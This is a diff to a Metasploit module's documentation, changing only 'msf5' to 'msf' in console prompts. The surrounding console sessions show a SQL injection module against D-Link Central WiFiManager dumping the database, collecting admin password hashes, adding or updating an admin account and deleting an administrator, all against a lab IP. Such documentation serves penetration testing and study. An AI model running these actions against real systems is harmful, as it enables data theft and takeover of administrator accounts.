@@ -35,7 +35,7 @@ Has been tested with 1.03r098.
 ## Actions
 
 ```
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > show actions
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > show actions
 
 Auxiliary actions:
 
@@ -50,7 +50,7 @@ Auxiliary actions:
 ## Options
 
 ```
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > show options
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > show options
 
 Module options (auxiliary/sqli/dlink/dlink_central_wifimanager_sqli):
 
@@ -74,15 +74,15 @@ This module has both `check` and `run` functions.
 ### Retrieving all the data from the database
 
 ```
-msf5 > use auxiliary/sqli/dlink/dlink_central_wifimanager_sqli 
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action SQLI_DUMP 
+msf > use auxiliary/sqli/dlink/dlink_central_wifimanager_sqli 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action SQLI_DUMP 
 action => SQLI_DUMP
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set rhosts 192.168.1.223
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set rhosts 192.168.1.223
 rhosts => 192.168.1.223
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > check 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > check 
 
 [+] 192.168.1.223:443 - The target is vulnerable.
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
 [*] Running module against 192.168.1.223
 
 [+] Target seems vulnerable
@@ -103,8 +103,8 @@ msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
 
 [+] devicesnmpsecuritytable saved to /home/redouane/.msf4/loot/20200828180154_default_192.168.1.223_dlink.http_825556.csv
 [*] Auxiliary module execution completed
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > creds
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > creds
 Credentials
 ===========
 
@@ -113,8 +113,8 @@ host  origin         service  public   private                           realm  
       192.168.1.223           admin    21232f297a57a5a743894a0e4a801fc3         Nonreplayable hash  raw-md5
       192.168.1.223           red0xff  f0e166dc34d14d6c228ffac576c9a43c         Nonreplayable hash  raw-md5
 
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > loot
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > loot
 
 Loot
 ====
@@ -129,44 +129,44 @@ host           service  type        name                         content        
 ult_192.168.1.223_dlink.http_878195.csv
 192.168.1.223           dlink.http  devicesnmpsecuritytable.csv  application/csv        /home/redouane/.msf4/loot/20200828180506_default_192.168.1.223_dlink.http_086271.csv
 
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
 ```
 
 ### Adding an admin user/changing the password of a user
 
 ```
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action ADD_ADMIN 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action ADD_ADMIN 
 action => ADD_ADMIN
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Username msfadmin
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Username msfadmin
 Admin_Username => msfadmin
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Password msfadmin
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Password msfadmin
 Admin_Password => msfadmin
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
 [*] Running module against 192.168.1.223
 
 [+] Target seems vulnerable
 [*] User not found on the target, inserting
 [*] Auxiliary module execution completed
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Password msfpassword
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Password msfpassword
 Admin_Password => msfpassword
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
 [*] Running module against 192.168.1.223
 
 [*] Trying to detect installed version
 [+] Target seems vulnerable
 [*] User already exists, updating the password
 [*] Auxiliary module execution completed
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > 
 ```
 
 ### Deleting an administrator user
 
 ```
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action REMOVE_ADMIN 
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set action REMOVE_ADMIN 
 action => REMOVE_USER
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Username red0xff
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > set Admin_Username red0xff
 Admin_Username => red0xff
-msf5 auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
+msf auxiliary(sqli/dlink/dlink_central_wifimanager_sqli) > run
 [*] Running module against 192.168.1.223
 
 [+] Target seems vulnerable
